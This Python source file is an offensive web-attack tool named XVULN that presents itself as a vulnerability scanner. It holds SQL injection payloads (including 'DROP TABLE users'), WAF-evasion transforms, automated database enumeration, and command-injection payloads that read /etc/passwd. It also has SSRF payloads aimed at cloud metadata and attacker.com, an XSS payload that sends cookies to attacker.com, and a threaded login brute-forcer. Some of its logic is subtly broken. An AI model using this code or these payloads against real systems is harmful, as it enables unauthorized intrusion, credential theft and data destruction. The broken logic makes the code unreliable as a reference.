import requests
import time
import random
import argparse
import pyfiglet
from urllib.parse import quote
import hashlib
import base64
import threading
import os
import logging
import itertools
import sys
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ANSI escape codes for dark red text
DARK_RED = "\033[31m"
RESET = "\033[0m"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
]

def get_random_user_agent():
    return random.choice(user_agents)

CACHE = {}

sql_injection_payloads = [
    "' OR 1=1--", "' OR 'x'='x--", "' UNION SELECT NULL, username, password FROM users--",
    "' AND (SELECT COUNT(*) FROM users) > 0--", "' OR sleep(5)--", 
    "' OR BENCHMARK(1000000, SHA1('test'))--", "'; EXEC xp_cmdshell('dir')--", 
    "'; DROP TABLE users--", "' OR 1=1;--"
]

blind_sql_payloads = [
    "' AND 1=1--", "' AND 1=2--",
    "' OR IF(1=1, SLEEP(5), 0)--", "' OR IF(1=2, SLEEP(5), 0)--",
    "' OR IF(LENGTH(database())>0, SLEEP(5), 0)--"
]

timing_attacks_payloads = [
    "'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--",
    "' OR IF(1=1, SLEEP(5), 0)--", "' AND IF(ASCII(SUBSTRING(database(),1,1))>64, SLEEP(5), 0)--"
]

ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",  
    "http://127.0.0.1/admin",  
    "http://localhost:80/",  
    "file:///etc/passwd",  
    "http://attacker.com/log.php?data=ssrf_test",  
    "http://[::1]/",  
    "http://2130706433/",  
    "http://0x7f000001/",  
]

command_injection_payloads = [
    "; ls", "| cat /etc/passwd", "`ls`", "; id", "| whoami", "`whoami`"
]

xss_payloads = [
    '<script>alert(1)</script>', 
    '<img src="x" onerror="alert(1)">', 
    '<script>document.location="http://attacker.com?cookie=" + document.cookie</script>',
    '<a href="javascript:alert(1)">Click me</a>'
]

def evade_waf(payload):
    evasion_techniques = [
        lambda p: p.replace(" ", "/**/"),  
        lambda p: quote(p),  
        lambda p: p.replace("'", "%27"),  
        lambda p: p.replace("=", "LIKE"),  
        lambda p: ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in p]),  
        lambda p: p.replace("'", "/*'*/"),  
        lambda p: base64.b64encode(p.encode()).decode('utf-8'),  
        lambda p: ''.join([f"0x{hex(ord(c))[2:]}" for c in p]),  
        lambda p: p[:len(p)//2] + "/* random comment */" + p[len(p)//2:],  
        lambda p: p.replace("SELECT", "SEL/**/ECT").replace("FROM", "FR/**/OM"),  
        lambda p: p + " AND SLEEP(" + str(random.randint(1, 5)) + ")--",  
    ]
    return random.choice(evasion_techniques)(payload)

def get_cached_response(payload, url):
    """Get cached response if available."""
    cache_key = hashlib.md5(f"{url}{payload}".encode()).hexdigest()
    return CACHE.get(cache_key)

def cache_response(payload, url, response):
    """Cache the response for a given URL and payload."""
    cache_key = hashlib.md5(f"{url}{payload}".encode()).hexdigest()
    CACHE[cache_key] = response

def check_command_injection(url, proxies=None):
    """Detects Command Injection vulnerabilities by testing common payloads."""
    vulnerabilities = []
    headers = {"User-Agent": get_random_user_agent()}
    for payload in command_injection_payloads:
        test_url = f"{url}{payload}"
        try:
            cached_response = get_cached_response(payload, url)
            if not cached_response:
                response = requests.get(test_url, proxies=proxies, timeout=5, headers=headers)
                cache_response(payload, url, response.text)
            else:
                response = cached_response

            if "root:x:" in response.text or "uid=" in response.text:
                vulnerabilities.append(("Command Injection", payload))
        except requests.exceptions.RequestException:
            pass

    return vulnerabilities

def check_xss(url, proxies=None):
    """Detects Cross-Site Scripting (XSS) vulnerabilities."""
    vulnerabilities = []
    headers = {"User-Agent": get_random_user_agent()}
    for payload in xss_payloads:
        test_url = f"{url}{payload}"
        try:
            cached_response = get_cached_response(payload, url)
            if not cached_response:
                response = requests.get(test_url, proxies=proxies, timeout=5, headers=headers)
                cache_response(payload, url, response.text)
            else:
                response = cached_response

            if payload in response.text:
                vulnerabilities.append(("Cross-Site Scripting (XSS)", payload))
        except requests.exceptions.RequestException:
            pass

    return vulnerabilities

def check_boolean_blind_sqli(url, proxies=None):
    """Detects Boolean-Based Blind SQL Injection by comparing responses."""
    vulnerabilities = []
    headers = {"User-Agent": get_random_user_agent()}
    true_payload = evade_waf("' AND 1=1--")
    false_payload = evade_waf("' AND 1=2--")

    try:
        cached_response_true = get_cached_response(true_payload, url)
        if not cached_response_true:
            response_true = requests.get(f"{url}{true_payload}", proxies=proxies, timeout=5, headers=headers)
            cache_response(true_payload, url, response_true.text)
        else:
            response_true = cached_response_true
        
        cached_response_false = get_cached_response(false_payload, url)
        if not cached_response_false:
            response_false = requests.get(f"{url}{false_payload}", proxies=proxies, timeout=5, headers=headers)
            cache_response(false_payload, url, response_false.text)
        else:
            response_false = cached_response_false
        
        if response_true != response_false:
            vulnerabilities.append(("Boolean-Based Blind SQL Injection", true_payload))
    except requests.exceptions.RequestException:
        pass

    return vulnerabilities

def check_timing_sqli(url, proxies=None):
    """Detects Time-Based Blind SQL Injection by measuring delays."""
    vulnerabilities = []
    headers = {"User-Agent": get_random_user_agent()}
    
    for payload in timing_attacks_payloads:
        evaded_payload = evade_waf(payload)
        start_time = time.time()
        try:
            cached_response = get_cached_response(evaded_payload, url)
            if not cached_response:
                response = requests.get(f"{url}{evaded_payload}", proxies=proxies, timeout=10, headers=headers)
                cache_response(evaded_payload, url, response.text)
            else:
                response = cached_response
            end_time = time.time()
            if end_time - start_time >= 5:
                vulnerabilities.append(("Time-Based Blind SQL Injection", evaded_payload))
        except requests.exceptions.RequestException:
            pass

    return vulnerabilities

def extract_database_info(url, proxies=None):
    """Extracts database information using SQL injection."""
    database_info = {}
    headers = {"User-Agent": get_random_user_agent()}
    
    db_name_payload = "' UNION SELECT database(), NULL--"
    table_names_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--"
    column_names_payload_template = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{}'--"
    
    try:
        response = requests.get(f"{url}{db_name_payload}", proxies=proxies, timeout=5, headers=headers)
        if response.status_code == 200:
            database_info['database_name'] = response.text
            print(f"{DARK_RED}Database Name: {database_info['database_name']}{RESET}")
        
        response = requests.get(f"{url}{table_names_payload}", proxies=proxies, timeout=5, headers=headers)
        if response.status_code == 200:
            database_info['table_names'] = response.text.split()
            print(f"{DARK_RED}Table Names: {database_info['table_names']}{RESET}")
        
        database_info['columns'] = {}
        for table in database_info['table_names']:
            column_names_payload = column_names_payload_template.format(table)
            response = requests.get(f"{url}{column_names_payload}", proxies=proxies, timeout=5, headers=headers)
            if response.status_code == 200:
                database_info['columns'][table] = response.text.split()
                print(f"{DARK_RED}Columns in {table}: {database_info['columns'][table]}{RESET}")
    
    except requests.exceptions.RequestException:
        pass
    
    return database_info

def check_sql_injection(url, proxies=None):
    """Detects SQL Injection, including Blind SQLi and Timing Attacks."""
    vulnerabilities = []
    headers = {"User-Agent": get_random_user_agent()}
    
    for payload in sql_injection_payloads:
        evaded_payload = evade_waf(payload)
        test_url = f"{url}{evaded_payload}"
        try:
            cached_response = get_cached_response(evaded_payload, url)
            if not cached_response:
                response = requests.get(test_url, proxies=proxies, timeout=5, headers=headers)
                cache_response(evaded_payload, url, response.text)
            else:
                response = cached_response

            if "error" in response or "mysql" in response or "syntax" in response:
                vulnerabilities.append(("SQL Injection", evaded_payload))
                database_info = extract_database_info(url, proxies)
                if database_info:
                    vulnerabilities.append(("Database Information", database_info))
        except requests.exceptions.RequestException:
            pass

    vulnerabilities.extend(check_boolean_blind_sqli(url, proxies))
    vulnerabilities.extend(check_timing_sqli(url, proxies))

    return vulnerabilities

def generate_ssrf_exploitation_payloads(base_url):
    """Generates a range of payloads to exploit SSRF vulnerabilities."""
    payloads = [
        f"{base_url}?url=http://169.254.169.254/latest/meta-data/",
        f"{base_url}?url=http://127.0.0.1/admin",
        f"{base_url}?url=http://localhost:80/",
        f"{base_url}?url=file:///etc/passwd",
        f"{base_url}?url=http://attacker.com/log.php?data=ssrf_test",
        f"{base_url}?url=http://[::1]/",
        f"{base_url}?url=http://2130706433/",
        f"{base_url}?url=http://0x7f000001/",
    ]
    return payloads

def check_ssrf(url, proxies=None):
    """Detects Server-Side Request Forgery (SSRF) vulnerabilities."""
    vulnerabilities = []
    headers = {"User-Agent": get_random_user_agent()}

    for payload in ssrf_payloads:
        test_url = f"{url}?url={payload}"
        try:
            cached_response = get_cached_response(payload, url)
            if not cached_response:
                response = requests.get(test_url, proxies=proxies, timeout=5, allow_redirects=False, headers=headers)
                cache_response(payload, url, response.text)
            else:
                response = cached_response
            
            if "instance-id" in response or "root:x:" in response or "admin" in response:
                vulnerabilities.append(("SSRF", payload))
                exploitation_payloads = generate_ssrf_exploitation_payloads(url)
                vulnerabilities.append(("SSRF Exploitation Payloads", exploitation_payloads))

        except requests.exceptions.RequestException:
            pass

    return vulnerabilities

def read_file(file_path):
    """Reads a file and returns a list of lines."""
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def brute_force(url, file_path, proxies=None):
    """Performs brute force attack using a list of names or passwords from a file."""
    credentials = read_file(file_path)
    total = len(credentials)
    headers = {"User-Agent": get_random_user_agent()}
    
    def attempt_login(credential):
        try:
            response = requests.post(url, data={"username": credential, "password": credential}, proxies=proxies, headers=headers)
            if "Welcome" in response.text or response.status_code == 200:
                print(f"{DARK_RED}[+] Valid credential found: {credential}{RESET}")
        except requests.exceptions.RequestException:
            pass
    
    threads = []
    for i, credential in enumerate(credentials):
        thread = threading.Thread(target=attempt_login, args=(credential,))
        threads.append(thread)
        thread.start()
        
        if i % 10 == 0:
            print(f"{DARK_RED}Progress: {i}/{total} credentials tested.{RESET}")
    
    for thread in threads:
        thread.join()
    
    print(f"{DARK_RED}Brute force attack completed.{RESET}")

def loading_spinner():
    spinner = itertools.cycle(['-', '\\', '|', '/'])
    while True:
        sys.stdout.write(f"{DARK_RED}{next(spinner)}{RESET}")  # write the next character
        sys.stdout.flush()               # flush stdout buffer (actual character display)
        sys.stdout.write('\b')           # erase the last written char
        time.sleep(0.1)

def main():
    ascii_banner = pyfiglet.figlet_format("XVULN", font="epic")
    print(f"{DARK_RED}{ascii_banner}{RESET}")

    parser = argparse.ArgumentParser(description=f"{DARK_RED}XVULN - Vulnerability Scanner{RESET}")
    parser.add_argument("url", nargs='?', help="The URL to scan")
    parser.add_argument("--sql", action="store_true", help="Perform SQL Injection scan")
    parser.add_argument("--ssrf", action="store_true", help="Perform SSRF scan")
    parser.add_argument("--xss", action="store_true", help="Perform XSS scan")
    parser.add_argument("--command", action="store_true", help="Perform Command Injection scan")
    parser.add_argument("--brute", help="Perform Brute Force attack using a file with names or passwords")
    parser.add_argument("--output", help="Output file to save the results")
    parser.add_argument("--proxy", help="Proxy to use for the requests")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    if not args.url:
        parser.print_help()
        input(f"{DARK_RED}Press Enter to exit...{RESET}")
        sys.exit(1)

    url = args.url
    file_path = args.brute
    output_file = args.output
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    vulnerabilities = []
    headers = {"User-Agent": get_random_user_agent()}
    
    spinner_thread = threading.Thread(target=loading_spinner)
    spinner_thread.daemon = True
    spinner_thread.start()
    
    # Run the appropriate scan
    if args.sql:
        vulnerabilities = check_sql_injection(url, proxies)
    elif args.ssrf:
        vulnerabilities = check_ssrf(url, proxies)
    elif args.xss:
        vulnerabilities = check_xss(url, proxies)
    elif args.command:
        vulnerabilities = check_command_injection(url, proxies)
    elif file_path:
        if os.path.exists(file_path):
            brute_force(url, file_path, proxies)
        else:
            print(f"{DARK_RED}File not found. Please provide a valid file path for brute force.{RESET}")
    
    spinner_thread.join()
    
    if vulnerabilities:
        for vuln, payload in vulnerabilities:
            if isinstance(payload, dict):
                print(f"{DARK_RED}[+] {vuln} detected with details: {payload}{RESET}")
            else:
                print(f"{DARK_RED}[+] {vuln} detected with payload: {payload}{RESET}")
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(vulnerabilities, f, indent=4)
            print(f"{DARK_RED}Results saved to {output_file}{RESET}")
    else:
        print(f"{DARK_RED}[-] No vulnerabilities detected.{RESET}")

    input(f"{DARK_RED}Press Enter to exit...{RESET}")

if __name__ == "__main__":
    main()
